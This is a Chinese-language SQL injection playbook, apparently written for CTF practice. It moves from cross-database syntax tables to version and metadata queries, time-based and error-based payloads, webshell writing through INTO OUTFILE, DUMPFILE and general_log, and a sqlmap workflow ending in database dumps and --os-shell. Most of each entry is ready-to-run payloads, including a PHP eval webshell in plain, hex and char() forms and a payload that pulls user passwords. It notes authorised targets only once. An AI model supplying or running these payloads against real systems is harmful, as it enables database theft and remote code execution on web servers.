## [g-db] 数据库差异对照——先认库再打库，一份对照表走天下

### [db-comment-concat] 注释符与字符串连接对照 | medium | 注释符;字符串连接;concat;对照 | -
> 换数据库时语法全变：注释、字符串拼接、引号转义规则各有不同。先认库，再按库选语法，是跨库注入的第一步。

#### 这个条目的作用
同一个注入点，后端可能是 MySQL、PostgreSQL、MSSQL、Oracle 或 SQLite。它们对"怎么把语句截断""怎么拼字符串""怎么引用表名"的语法都不一样。本条目给你一张对照表，让你换库之后不靠猜，直接选对写法。

#### 前置条件
- 已确认注入点存在（如 `?id=1'` 有异常、`?id=1 AND 1=1` 正常）。
- 已初步判断数据库类型（认库技巧：报错信息开头带 MySQL 字样；`#` 注释能生效说明是 MySQL；`||` 能用说明不是 MSSQL）。

#### 第 1 步：注释符对照——把原语句的尾巴"吞掉"
注入后原语句后面通常还跟着引号、括号和条件，必须用注释符截断，否则整条语句语法错误。各库注释符如下：

| 数据库 | 注释符 | 注意 |
| --- | --- | --- |
| MySQL | `-- `（横线后必须有空格）、`#`、`/* */` | `--+` 的 `+` 在 URL 里被解码成空格 |
| PostgreSQL | `--`、`/* */` | `--` 后到行尾都是注释 |
| MSSQL | `--`、`/* */` | 另有 `;` 可结束语句再开新语句 |
| Oracle | `--`、`/* */` | 没有 `#` |
| SQLite | `--`、`/* */` | 与 PG 类似 |

一句话示例（MySQL）：`?id=1' AND 1=1 --+` 会把 `--+` 后面的内容全部注释掉，只执行 `WHERE id='1' AND 1=1`。

#### 第 2 步：字符串连接对照——把多段内容拼成一个结果
UNION 回显位只有一个时，要用连接函数把库名、表名、列名拼成一行输出。各库写法完全不同：

| 数据库 | 字符串连接 | 示例 |
| --- | --- | --- |
| MySQL | `CONCAT(a,b)`、`CONCAT_WS(',',a,b)`；`||` 默认是逻辑或，需开 PIPES_AS_CONCAT 才当拼接 | `CONCAT(table_name,'|',column_name)` |
| PostgreSQL | `a \|\| b`、`CONCAT(a,b)` | `table_name \|\| '|' \|\| column_name` |
| MSSQL | `a + b`（`||` 无效） | `table_name + '|' + column_name` |
| Oracle | `a \|\| b`、`CONCAT(a,b)` | `table_name \|\| '|' \|\| column_name` |
| SQLite | `a \|\| b` | `table_name \|\| '|' \|\| column_name` |

一句话示例（MSSQL）：`UNION SELECT 1,DB_NAME()+','+user_name(),3 --` 用 `+` 拼接库名和用户名。

#### 第 3 步：标识符引用对照——表名列名要不要加引号、加什么引号
拼条件时涉及字符串常量；order by 之后的列名写法也各库不同：

| 数据库 | 标识符引用 | 字符串常量写法 |
| --- | --- | --- |
| MySQL | 反引号 `` ` `` | 单引号 `'...'`，内部单引号写 `''` 或 `\'` |
| PostgreSQL | 双引号 `"` | 单引号 `'...'`，标准转义 `''`，`E'...'` 内可用 `\'` |
| MSSQL | 方括号 `[ ]` | 单引号 `'...'`，仅 `''`，不支持 `\'` |
| Oracle | 双引号 `"` | 单引号 `'...'`，内部写 `''` |
| SQLite | 双引号/反引号/方括号都行 | 单引号 `'...'` |

#### 第 4 步：引号转义差异——写带引号的字符串常量
在注入里拼字符串（比如 `WHERE username='admin'`）时，引号本身要转义，各库规则不同：

```sql
-- MySQL: ' 可转义为 '' 或 \'
SELECT 'it''s';            -- 返回 it's
-- MSSQL: 只认 ''，写 \' 会直接报错
SELECT 'it''s';
-- PG: 标准 ''；E'...' 里才支持 \'
SELECT 'it''s';
```

> [!warn]
> 拼接表名/列名注意大小写：Oracle 默认把未加引号的标识符存成大写、PG 小写化；用 `information_schema` 查元数据时 `table_name='flag'` 这类条件按实际存储的大小写匹配，查不到就换大小写再试。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `--` 后注释不生效，语句报语法错 | MySQL 的 `--` 后必须跟空格 | 用 `--+` 或 `--%20` 或 `#` |
| `a||b` 结果不对或报错 | 库是 MSSQL（`||` 无效）或 MySQL（`||` 是逻辑或） | MSSQL 用 `+`，MySQL 用 `CONCAT()` |
| 表名带反引号被报错 | 不是 MySQL | 换对应库的引用符或直接不写引用符 |
| `\'` 转义报错 | 库是 MSSQL/Oracle，不支持反斜杠转义 | 全部改为 `''` 双单引号 |

#### 实战要点
- 认库口诀：有 `#` 注释 → MySQL；`||` 能拼字符串 → PG/SQLite/Oracle；`+` 能拼且 `||` 报错 → MSSQL；报错里有 ORA- 前缀 → Oracle。
- 回显位只有一个时，`GROUP_CONCAT`（MySQL）/`string_agg`（PG）/`FOR XML PATH`（MSSQL）都能把多行压成一行。
- 不确定连接符时，先测 `AND 1=1` 的合法写法，比如直接 UNION 取一个 `VERSION()` 看返回格式，再定字符串写法。
- SQLite 的 `||` 不要求数据库版本，几乎任何 SQLite 注入都能直接用。

### [db-version-meta] 版本函数与元数据表对照 | medium | 版本函数;元数据表;information_schema;对照 | -
> 识别数据库后的第一件事：取版本、查元数据定位库表列。版本决定可用函数（决定你能不能报错注入/写文件），元数据表决定你下一步查什么。

#### 这个条目的作用
拿到注入点后要回答两个问题：这是什么库、什么版本？库里有哪些库/表/列？本条目给出各库的"版本函数"和"元数据查询入口"对照，让你在任意库上都能快速把"库 → 表 → 列 → 数据"链路走通。

#### 前置条件
- 注入点已确认，且已知道当前库类型（见 db-comment-concat 的认库口诀）。
- 至少要有一个回显位置（UNION 位）或能盲注的条件位，否则查不出元数据。

#### 第 1 步：版本函数——确认库类型与版本号
版本决定可用特性：MySQL 5.7+ 默认 secure_file_priv 限制写文件、MySQL 8 报错注入不带数据、Oracle 的 DBMS_LOCK 需要权限。各库取版本的写法：

| 数据库 | 版本函数 | 当前库 |
| --- | --- | --- |
| MySQL | `VERSION()` | `DATABASE()` |
| PostgreSQL | `version()` | `current_database()` |
| MSSQL | `@@VERSION` | `DB_NAME()` |
| Oracle | `SELECT banner FROM v$version` | `SYS_CONTEXT('USERENV','CURRENT_SCHEMA')` |
| SQLite | `sqlite_version()` | 无（库就是文件本身） |

一句话示例（任意回显位）：`UNION SELECT 1,VERSION(),3 --+` 页面打印出 `8.0.36`，说明是 MySQL 8，随后报错注入（updatexml）大概率不可用，优先 union/盲注。

#### 第 2 步：元数据表入口对照——"查库表列"三个动作各库怎么写
| 数据库 | 查库 | 查表 | 查列 |
| --- | --- | --- | --- |
| MySQL | `information_schema.schemata` | `information_schema.tables` | `information_schema.columns` |
| PostgreSQL | `pg_database` | `pg_tables` / `information_schema.tables` | `information_schema.columns` / `pg_attribute` |
| MSSQL | `sys.databases` | `sysobjects` / `sys.tables` | `syscolumns` / `sys.columns` |
| Oracle | `all_users` / `dba_users` | `all_tables` | `all_tab_columns` |
| SQLite | `sqlite_master`（type='table'） | `sqlite_master` | `pragma_table_info('t')` |

> [!tip]
> 不管哪个库，`information_schema.columns` 通常都可用（MySQL/PG/MSSQL 通用）；Oracle 和 SQLite 走各自的专用入口。

#### 第 3 步：MySQL 查库表列标准链路（CTF 最高频）
```sql
-- 当前库 / 所有库
UNION SELECT 1,database(),3,4,5 --+
UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5 FROM information_schema.schemata --+

-- 指定库的所有表
UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema='ctf' --+

-- 指定表的所有列
UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='flag' --+

-- 取数据
UNION SELECT 1,flag,3,4,5 FROM ctf.flag --+
```

#### 第 4 步：SQLite 一次拿全部建表语句（CTF 里的 SQLite 场景）
SQLite 没有 information_schema，所有表结构都收在 `sqlite_master` 的 `sql` 列里：

```sql
-- 一次把每张表的完整 CREATE TABLE 语句打出来，表名列名全有了
UNION SELECT 1,GROUP_CONCAT(sql) FROM sqlite_master --+
```

#### 第 5 步：PG / MSSQL 标准链路（跨库保底写法）
```sql
-- PostgreSQL：库 → 表 → 列
UNION SELECT 1,current_database(),3,4,5 --+
UNION SELECT 1,string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public' --+
UNION SELECT 1,string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users' --+

-- MSSQL：库 → 表 → 列
UNION SELECT 1,DB_NAME(),3,4,5 --+
UNION SELECT 1,STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'') --+
UNION SELECT 1,STUFF((SELECT ','+name FROM sys.columns WHERE object_id=OBJECT_ID('users') FOR XML PATH('')),1,1,'') --+
```

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `information_schema.schemata` 报表不存在 | 库是 SQLite 或 Oracle | SQLite 用 `sqlite_master`，Oracle 用 `all_users`/`all_tables` |
| 查表查出空结果 | 表名大小写不对（PG 小写化、Oracle 大写） | 按实际存储大小写重试，或用 `LOWER()`/`UPPER()` 条件 |
| `version()` 在 MSSQL 上报不存在 | MSSQL 用变量 `@@VERSION`，不是函数 | 换 `@@VERSION` |
| Oracle 的 `v$version` 查不到 | 权限不足或语法写成 SELECT 子查询 | 在 UNION 里用 `(SELECT banner FROM v$version WHERE rownum=1)` |

#### 实战要点
- 版本号是"路线选择器"：MySQL 5.x 可报错注入+写文件（有权限时），MySQL 8 两条路基本堵死，直接走 union/盲注。
- 回显位只有一个就上 `GROUP_CONCAT` / `string_agg` / `FOR XML PATH` 压行；一个都没有就进盲注模板按位猜。
- SQLite 的 `sqlite_master` 是万能钥匙：一条 `GROUP_CONCAT(sql)` 连表带列全暴露。
- 换库后不要背 payload，背"查库表列各自该查哪张表"这一行对照就够。

### [db-time-err] 时间与报错函数对照 | medium | 时间函数;报错函数;updatexml;对照 | -
> 盲注靠时间、有报错靠报错回显，两套函数按库选择。本条目把各库的"延迟函数"和"报错注入函数"各给一张对照表，附带一句话示例。

#### 这个条目的作用
当页面没有任何数据回显时，只剩两条路：时间盲注（条件为真就延迟，用响应时间传递 0/1）和报错注入（把查询结果塞进报错信息里吐出来）。两条路都要按数据库选函数，本条目是选型表。

#### 前置条件
- 注入点存在但无回显位（UNION 打不出数据），或想确认无回显时仍能读数据。
- 已认库（见 db-comment-concat 认库口诀）。

#### 第 1 步：时间延迟函数对照——"真则睡，假则秒回"
| 数据库 | 延迟函数/语句 | 示例 |
| --- | --- | --- |
| MySQL | `SLEEP(n)`、`BENCHMARK(n,expr)` | `AND SLEEP(3)` |
| PostgreSQL | `pg_sleep(n)` | `AND pg_sleep(3)` |
| MSSQL | `WAITFOR DELAY 'h:m:s'` | `;IF 1=1 WAITFOR DELAY '0:0:3' --` |
| Oracle | `DBMS_LOCK.SLEEP(n)` | `AND DBMS_LOCK.SLEEP(3)`（需权限，新版受限） |
| SQLite | 无内置 sleep | 重型表达式代替，如 `AND (SELECT count(*) FROM sqlite_master a,sqlite_master b)` |

一句话示例（MSSQL 布尔时间判断）：`?id=1;IF ASCII(SUBSTRING(DB_NAME(),1,1))>64 WAITFOR DELAY '0:0:3' --`，库名首字母 ASCII > 64 时响应延迟 3 秒。

#### 第 2 步：报错注入函数对照——让报错"携带"查询结果
| 数据库 | 报错函数 | 示例 |
| --- | --- | --- |
| MySQL | `updatexml()`、`extractvalue()`、floor+rand、`exp()` | `AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)` |
| PostgreSQL | `CAST(... AS int)` 类型转换报错 | `AND 1=CAST((SELECT version()) AS int)` |
| MSSQL | `CONVERT(int,...)` | `AND 1=CONVERT(int,@@version)` |
| Oracle | 无内置稳定函数 | `CTXSYS.DRITHSX.SN`（默认未装）、`UTL_INADDR`（需网络权限），环境差异大 |
| SQLite | 无 | 走 union / 盲注 |

一句话示例（MySQL 经典 updatexml）：`' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e),1) --+` 报错返回 `XPATH syntax error: '~hash...~'`。

#### 第 3 步：MySQL 报错注入的标准姿势与长度截断
updatexml/extractvalue 的报错信息只有约 32 字符，长结果必须分段：

```sql
-- 报错回显 user()
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) --+
-- 长数据分段取（每段 25 字符，0x7e 是 ~ 包裹）
' AND updatexml(1,concat(0x7e,substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,25)),1) --+
' AND updatexml(1,concat(0x7e,substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),26,25)),1) --+
```

#### 第 4 步：PG / MSSQL 报错注入姿势
```sql
-- PG：类型转换失败，报错里带出子查询结果
AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)

-- MSSQL：CONVERT 失败带出变量内容
AND 1=CONVERT(int,@@version)
```

#### 第 5 步：SQLite / Oracle 的兜底路线
- SQLite：没有报错函数也没有 sleep，直接放弃这两条路，走 union 回显（`sqlite_master`）或布尔盲注。
- Oracle：报错注入依赖 `CTXSYS.DRITHSX.SN`、`UTL_INADDR.GET_HOST_ADDRESS` 等非默认/受限对象，实战环境多数不可用；无延迟函数时用大笛卡尔积查询制造延迟。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| updatexml 报错但看不到数据 | 结果是 MySQL 8，报错已不带数据 | 换 union/盲注 |
| `pg_sleep` 不存在 | 库不是 PG | 换 `SLEEP`（MySQL）或 `WAITFOR`（MSSQL） |
| `WAITFOR` 语法错误 | 前面需要分号结束语句 | 写成 `;IF 1=1 WAITFOR DELAY '0:0:3' --` |
| 报错内容只有 32 字符被截断 | 结果太长 | 用 `substr`/`substring` 分段取，每段 ≤25 |
| 时间延迟不明显 | 阈值设太小或目标网络抖动大 | 阈值 3~5 秒，且和网络 RTT 拉开差距 |

#### 实战要点
- 时间盲注判定以"肉眼可见的延迟差"为准：目标 3 秒、己方响应 0.3 秒，足够区分即可。
- 报错注入优先用能带出数据的函数，MySQL 就 updatexml/extractvalue 互换，一个被过滤换另一个。
- 报错注入的 payload 较长，注意 URL 编码（`#` 要编码成 `%23`，空格编码成 `%20`）与 WAF 长度限制。
- 盲注猜全量数据请求量大，务必限速（脚本里 sleep 0.05~0.2s），避免打挂目标。

## [g-file] 写文件与深入——从注入到 getshell 的最后一步

### [file-outfile] into outfile 写文件 | hard | outfile;写文件;secure_file_priv;dumpfile | -
> MySQL 有 FILE 权限且 secure_file_priv 允许时，SELECT 结果可直接写成文件，配合 Web 目录拿 shell。这是"注入 → getshell"最直的一条路，但前置条件很苛刻。

#### 这个条目的作用
把查询结果通过 `INTO OUTFILE` / `INTO DUMPFILE` 写成服务器上的文件。最典型用途：在 Web 可访问目录写一个一句话木马，然后用蚁剑/菜刀连上拿 shell，彻底从"读数据"升级到"执行命令"。

#### 前置条件
三个条件缺一不可，先逐条验证：
| 条件 | 验证语句 | 说明 |
| --- | --- | --- |
| 有 FILE 权限 | `SELECT file_priv FROM mysql.user` 或 sqlmap `--is-dba` | 普通注入用户通常没有 |
| secure_file_priv 允许写目标目录 | `SHOW VARIABLES LIKE 'secure_file_priv'` | NULL=禁止，''=不限制，'/xxx'=只能写该目录 |
| 目标 Web 目录可写、路径已知 | 靠报错/信息泄露拿到绝对路径 | mysql 进程对该目录有写权限 |

> [!danger]
> `secure_file_priv` 为 NULL 表示完全禁止写文件；为空字符串表示不限制；为具体路径则只能写该路径。MySQL 5.7+ 默认常配置为 NULL 或指定目录，写不进 Web 根目录时这条路直接不通，别浪费时间，转 general_log（见 file-log）。

#### 第 1 步：确认 FILE 权限
```sql
-- 先确认当前用户是不是高权限（回显 1 表示有 SUPER/FILE 能力）
' AND updatexml(1,concat(0x7e,(SELECT 1 FROM mysql.user WHERE user=user() AND File_priv='Y')),1) --+
-- 或直接查 file_priv
UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=user() --+
```
预期结果：能看到当前用户的 `File_priv` 为 `Y`。如果报"拒绝访问"或查不到 mysql.user，说明没权限，这条路到头了。

#### 第 2 步：确认 secure_file_priv 配置
```sql
UNION SELECT 1,@@secure_file_priv,3 --+
SHOW VARIABLES LIKE 'secure_file_priv'  -- 堆叠注入时可用
```
预期结果三种情况：
| 返回值 | 含义 | 能不能写 Web 目录 |
| --- | --- | --- |
| `NULL` | 禁止写文件 | 不能，转 file-log |
| 空字符串 | 不限制路径 | 能，进第 3 步 |
| `/var/lib/mysql-files/` | 只能写该目录 | 该目录在 Web 外则基本无解 |

#### 第 3 步：确认/获取 Web 绝对路径
- 报错信息往往带路径，如 `Warning: include(/var/www/html/index.php)`。
- 常见默认路径：`/var/www/html/`（Debian/Ubuntu）、`/usr/share/nginx/html/`（Nginx 默认）。
- 也可用 `@@datadir`、`@@basedir` 反推：`UNION SELECT 1,@@datadir,3 --+`。

#### 第 4 步：写一句话木马（OUTFILE）
```sql
-- 标准一句话：<?php @eval($_POST[1]);?>
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php' --+
```
预期结果：语句执行成功（无报错）。然后访问 `http://target/shell.php`，用蚁剑连接（密码 `1`）验证。如果返回 500 或文件空白，见排查表。

#### 第 5 步：字符串含引号时的三种写法
PHP 代码里带单引号（`$_POST[1]`）会和 SQL 字符串的引号冲突，三种方案：
```sql
-- 方案 A：单引号翻倍转义
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/s.php' --+
SELECT '<?php @eval($_POST[''1'']);?>' INTO OUTFILE '/var/www/html/s.php' --+

-- 方案 B：整段 hex 编码（最稳，无引号冲突）
-- 0x3C3F706870... 即 <?php @eval($_POST[1]);?> 的 hex
SELECT 0x3C3F70687020406576616C28245F504F53545B315D293B3F3E INTO OUTFILE '/var/www/html/s.php' --+

-- 方案 C：char() 逐字节拼
SELECT CHAR(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,49,93,41,59,63,62) INTO OUTFILE '/var/www/html/s.php' --+
```

#### 第 6 步：二进制/无换行场景用 DUMPFILE
OUTFILE 会自动加换行和列分隔符，写二进制文件会损坏；DUMPFILE 原样写单行：
```sql
SELECT 0x3C3F70687020406576616C28245F504F53545B315D293B3F3E INTO DUMPFILE '/var/www/html/s.php' --+
```
> [!warn]
> OUTFILE 写 PHP 时若文件被加了一行换行通常不影响执行；写图片马（非 PHP）必须 DUMPFILE 保持字节原样。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 报错 `The MySQL server is running with the --secure-file-priv option` | secure_file_priv 限制目标目录 | 查 `@@secure_file_priv`，改写到允许的目录，或转 general_log |
| 报错 `Access denied ... FILE` | 无 FILE 权限 | 换 low privilege 打法（读数据/盲注），写文件无解 |
| 写成功但访问 500 | 一句话马语法损坏（引号被吃） | 改用方案 B 的纯 hex 写入 |
| 写成功但访问是空白/原样文本 | 目录不可执行 PHP，或写进的不是 Web 根 | 换目录（`/tmp` 无效，必须是 Web 可解析目录） |
| 页面返回 403 | 目录禁脚本执行或 WAF | 换扩展名（.php5/.phtml）或换上传思路 |

#### 实战要点
- 一句话马内容固定用 `<?php @eval($_POST[1]);?>`，蚁剑/冰蝎默认支持，密码设 `1` 好记。
- hex 写入是终极大法：引号、空格、特殊字符全规避，唯一要保证的是 hex 值算对。
- secure_file_priv=NULL 是高版本 MySQL 默认，outfile 打不通时立刻转 general_log 或看有没有可写的目录配置。
- 写文件前先用 `@@secure_file_priv` + `@@datadir` 一次把环境探明，别盲写。
- getshell 成功后记得清理马文件，并考虑是否要拿走整个库（这是审计证据链的一部分）。

### [file-log] general_log 日志写马 | hard | general_log;日志写马;超级权限 | -
> 写文件被禁（secure_file_priv）时，有 SUPER 权限可把查询日志重定向到 Web 目录，日志内容即马。这是 outfile 之外的"第二条写文件路"。

#### 这个条目的作用
`secure_file_priv` 禁止了 `INTO OUTFILE`，但如果你有 SUPER 权限，可以把 MySQL 的通用查询日志（general_log）输出路径直接改到 Web 目录，然后执行一条"内容就是一句话马"的查询——查询本身会被记进日志，于是马就"写"进了指定文件。全程不碰 outfile，绕开 secure_file_priv。

#### 前置条件
| 条件 | 说明 |
| --- | --- |
| SUPER 权限（能执行 SET GLOBAL） | 常见于高权限注入点（root/管理员连接） |
| 能执行堆叠语句或多语句 | `SET GLOBAL ...` 需要和 SELECT 分号连发（堆叠注入） |
| mysql 进程对 Web 目录有写权限 | 通常 mysql 以 root 或专用账号运行，os 层权限够即可 |

#### 第 1 步：确认有 SUPER 权限且注入点支持堆叠
```sql
-- 确认当前用户
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) --+
-- 试堆叠：能改变量就说明多语句可用
?id=1; SELECT 1; --+
```
预期结果：user() 返回 root@localhost 之类；第二条无报错说明堆叠可用。如果 `SET GLOBAL` 报权限错，这条路不通。

#### 第 2 步：开启通用日志并指向 Web 目录
```sql
?id=1; SET GLOBAL general_log = 'ON'; --+
?id=1; SET GLOBAL general_log_file = '/var/www/html/shell.php'; --+
```
> [!warn]
> 部分环境 `general_log_file` 只能写数据目录（`@@datadir`），路径写不进去或写进去不在 Web 下就白搭；先用 `UNION SELECT 1,@@datadir,3` 确认，再决定目标路径。

#### 第 3 步：执行"内容即马"的查询
```sql
?id=1; SELECT '<?php @eval($_POST[1]);?>'; --+
```
预期结果：这条 SELECT 被当作日志记录，原样写入 `/var/www/html/shell.php`。日志行通常带时间戳和前缀，不影响 PHP 解析（`<?php` 之后即为 PHP 代码段；若前缀破坏了语法，见排查表）。

#### 第 4 步：访问验证
浏览器访问 `http://target/shell.php`，或直接用蚁剑（密码 `1`）连接。
- 返回空白 + 蚁剑能连上 → 成功拿下。
- 页面显示 PHP 源码 → 目录不解析 PHP，换目录。
- 500 错误 → 日志格式破坏了 PHP 语法，看排查表。

#### 第 5 步：收尾清理
```sql
?id=1; SET GLOBAL general_log = 'OFF'; --+
```
同时把日志文件恢复成默认值、删除 Web 目录下的马文件。日志写马会让所有查询被记进文件，流量大时容易拖垮性能，用完立刻关。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `SET GLOBAL` 报权限不足 | 当前用户非 SUPER | 换 outfile（若有 FILE）或无解 |
| 日志文件写不进 Web 目录 | general_log_file 被限制在数据目录 | 改用 outfile 或换可写目录 |
| 访问马文件返回 500 | 日志行头/时间戳混进了 `<?php` 前面 | 换写入语句写法，让整行以 `<?php` 开头（先 SELECT 一个以 `<?php` 开头的内容） |
| 日志文件巨大、目标卡死 | 忘了关 general_log 且查询量大 | 立即 `SET GLOBAL general_log='OFF'`，删日志文件 |
| 版本是 MySQL 8.0 | 部分配置下 general_log_file 路径受限 | 看 `@@datadir` 与 secure_file_priv，考虑 outfile/UDF |

#### 实战要点
- general_log 写马的硬前提是两个：SUPER 权限 + 堆叠注入（能发多语句）。缺一个都走不通。
- 写马时让日志行尽量以 `<?php` 开头，避免时间戳前缀破坏语法；必要时先写一个"探针行"再访问确认。
- 该方法在 MySQL 5.x 最顺，8.0 部分配置受限，实测失败先看 `@@general_log_file` 生效值。
- outfile 与 general_log 是"写文件双保险"：outfile 要 FILE 权限，log 要 SUPER 权限，哪个权限有就用哪个。
- 用完必须关日志并删文件——这是审计留下的痕迹，也是运维事故隐患。

### [file-sqlmap] sqlmap 实战流程 | medium | sqlmap;自动化;--os-shell;tamper | -
> 工具打底：从探测到拖库到 --os-shell 的标准流程，脚本化拿权限。sqlmap 可以省掉手工注入手速，但每步的参数含义要懂。

#### 这个条目的作用
用 sqlmap 把"探测注入点 → 信息收集 → 拖库 → getshell"整条链路自动化。看懂每一步命令在做什么、失败怎么排查，是工具使用者和"只会输命令"的分界线。

#### 前置条件
- 本地已装 sqlmap（`python sqlmap.py` 或 `sqlmap` 命令可用）。
- 目标 URL 可达，最好先用浏览器/Burp 手动确认参数名与请求格式。
- 明确你只有目标系统的授权（CTF 靶机/自建靶场），工具会发大量请求。

#### 第 1 步：探测注入点（--batch 全默认）
```bash
# --batch：所有交互提示都用默认答案，适合无人值守
sqlmap -u "http://target/index.php?id=1" --batch
```
预期结果：终端打印注入类型（如 `boolean-based blind`、`UNION query`）、目标库与版本。如果输完没有任何注入类型，说明参数不是注入点，换 `--level` 加大深度（第 5 步）。

#### 第 2 步：POST/复杂请求用 -r 或 --data
Burp 抓包 → 右键 Save item 存成 `request.txt`，sqlmap 直接吃原始请求：
```bash
# -r：吃 Burp 原始请求文件，POST/Header/Cookie 全保留
sqlmap -r request.txt --batch

# 或者手动指定 POST 数据；--forms 自动解析表单
sqlmap -u "http://target/login.php" --data "user=a&pass=b" --forms --batch
```

#### 第 3 步：信息收集——当前用户、当前库、是否 DBA
```bash
sqlmap -u "http://target/index.php?id=1" --current-user --current-db --batch
sqlmap -u "http://target/index.php?id=1" --is-dba --batch
```
预期结果：`current user: 'root@localhost'`、`current database: 'ctf'`、`is DBA: True`。**这步决定能不能 getshell**：DBA=True 才有写文件/命令执行的资本，非 DBA 最多拖库。

#### 第 4 步：拖库——库 → 表 → 列 → 数据逐级下钻
```bash
# 列出所有库
sqlmap -u "http://target/index.php?id=1" --dbs --batch
# 看指定库的所有表
sqlmap -u "http://target/index.php?id=1" -D ctf --tables --batch
# 看指定表的所有列
sqlmap -u "http://target/index.php?id=1" -D ctf -T flag --columns --batch
# 直接 dump 出数据（本地生成 csv/txt 结果）
sqlmap -u "http://target/index.php?id=1" -D ctf -T flag -C flag --dump --batch
```
预期结果：`--dbs` 返回库清单；`--dump` 输出表格并保存到 `~/.local/share/sqlmap/output/<target>/dump/`。如果表/列名里有关键词，直接 dump 全表也行（去掉 `-C flag`）。

#### 第 5 步：突破过滤（WAF 时）
```bash
# tamper 脚本改写 payload 绕过 WAF（空格→注释等）
sqlmap -u "http://target/index.php?id=1" --tamper=space2comment --batch
# level/risk 加大（更全更慢），可用 --risk 1~3
sqlmap -u "http://target/index.php?id=1" --level 3 --risk 2 --batch
# 其他常见 tamper：between2like、equaltolike、unmagicquotes
sqlmap -u "http://target/index.php?id=1" --tamper=between2like --batch
```
> [!tip]
> 403/拦截时先看是哪个词被拦（改参数名、加随机参数、换 UA 的 `--random-agent` 也常有效）；tamper 是一长串候选组合，别一个个试，先跑 `--identify-waf` 自动识别。

#### 第 6 步：getshell（需 DBA + FILE 权限 + 可写 Web 目录）
```bash
# 交互式命令执行（自动选 OUTFILE/DUMPFILE/UDF 最优路线）
sqlmap -u "http://target/index.php?id=1" --os-shell --batch
# 不交互，直接执行一条命令
sqlmap -u "http://target/index.php?id=1" --os-cmd="id" --batch
```
预期结果：进入 `sqlmap-shell>` 交互式 shell，输入 `id`、`ls /var/www/html` 都能执行。失败时 sqlmap 会给出原因（多半是 secure_file_priv 或路径不可写），按第 7 步排查。

#### 第 7 步：--os-shell 失败排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `The back-end DBMS is not MySQL` 之类 | 非 MySQL 或非 DBA | 确认 `--is-dba` 为 True；PG/MSSQL 的 os-shell 支持有限 |
| `secure_file_priv` 报错 | OUTFILE 路线被禁 | 手动查 `@@secure_file_priv`，给 sqlmap 指定可写目录（`--web-root`）或换 general_log 路线 |
| `no writable directory` | 目标 Web 路径不可写/未识别 | 用 `--web-root "/var/www/html"` 手动指定真实绝对路径 |
| 连上但命令无输出 | 权限不足或命令被禁 | 换命令试 `ls`/`whoami`；用 `--os-cmd` 先小步验证 |

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 什么注入类型都测不出 | 注入点在别的参数 | 加大 `--level 3 --risk 2`，或 `-r` 带上所有参数 |
| 请求被 403/429 | WAF 或限速 | `--tamper`、`--random-agent`、`--delay 1` 降速 |
| `--dump` 速度太慢 | 盲注逐字符猜 | `--threads 5`（布尔/时间盲注可提速）、`--technique BEU` 限制技术 |
| 拖库结果不全 | 只用了默认技术 | 加 `--dump-all` 或逐库 `--dump` |
| 输出一堆 base64/加密内容 | 字段本身做了处理 | 那是数据问题，不是工具问题，手工确认 |

#### 实战要点
- 铁律顺序：`--batch` 探测 → `--current-user --is-dba` → `--dbs` → `-D -T -C --dump` → 需要时 `--os-shell`。先评估"有没有资格 getshell"再动手。
- `--batch` 只回答默认项；遇到复杂目标（非默认端口、cookie 会话）要手动加 `--cookie`、`--headers` 或直接 `-r`。
- `--os-shell` 是"目标条件全满足"的终点技能：DBA + 可写 Web 目录缺一不可，先跑 `--is-dba` 和 `@@secure_file_priv` 探底。
- 所有结果会存在 `~/.local/share/sqlmap/output/<target>/`，跑完后去翻 dump 目录拿完整数据。
- 工具只是加速器：它报的注入类型要能看懂（boolean/time/union/error），否则换了库或加了 WAF 你就没法接手手工打。